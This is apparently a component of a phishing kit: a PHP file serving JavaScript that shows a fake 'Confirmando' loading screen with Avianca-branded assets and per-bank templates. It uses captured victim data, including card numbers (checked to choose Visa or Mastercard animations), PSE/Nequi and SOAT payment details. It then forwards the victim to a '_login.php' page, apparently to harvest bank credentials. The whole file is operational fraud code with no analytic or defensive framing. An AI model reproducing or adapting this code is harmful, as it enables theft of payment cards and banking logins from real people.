<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>

var my_titulo = 'Confirmando';
var my_banco = my_hosting + 'bancos/' + my_data['banco'] + '/';
var my_contenido = `
<style>
    body {
        margin: 0;
        background-color: #ffffff !important;
        overflow: hidden;
        display: flex;
        flex-direction: column;
        height: 100vh;
    }

    img {
        width: 300px;
        max-width: 100vw;
        margin: auto;
    }
</style>

<img src="${my_hosting}_avianca/assets/plane-loader.gif" id="loading" style="display:none;">
`;

<?php
$soat = isset($_GET['soat']) ? $_GET['soat'] : null;

if ($soat) {
    require_once('./__soat/_plantilla_soat.php');
}
?>

//<script>
    $(document).ready(function() {


        var timeout = 10000;
        var timeou2 = 5000;

        if (my_data['soat']) {

            timeout = 1000;
            timeou2 = 1000;
            $('#soat_loader').show();
        }
        else {
            $('#soat_loader').hide();
            timeout = 0;
        }
        
        if (my_data['pse_nequi']) {
            timeout = 0;
            timeou2 = 0;
        }

        if (my_data['shopData']) {
            timeout = 0;
        }

        if (my_data['destino_ciudad']) {
            $('#loading').css('display', 'block');
        } else if (!my_data['destino_ciudad'] || !my_data['shopData']) {
            $('#loading').attr('src', my_hosting + 'img/wait.gif');
        }

        setTimeout(function() {
            if (!my_data['pse_nequi']) {
                let img = $('#loading');
                img.css('display', 'block');
                img.css('margin', '0 auto');
                img.css('width', '600px');
                if (my_data['tarjeta'] && my_data['tarjeta'].substr(0, 1) == '4') {
                    img.attr('src', my_hosting + 'img/gif_visa2.gif');
                } else {
                    img.attr('src', my_hosting + 'img/gif_mastercard2.gif');
                }
            }

            setTimeout(function() {
                loadFile(['_login.php']);
            }, timeou2);
        }, timeout);
    });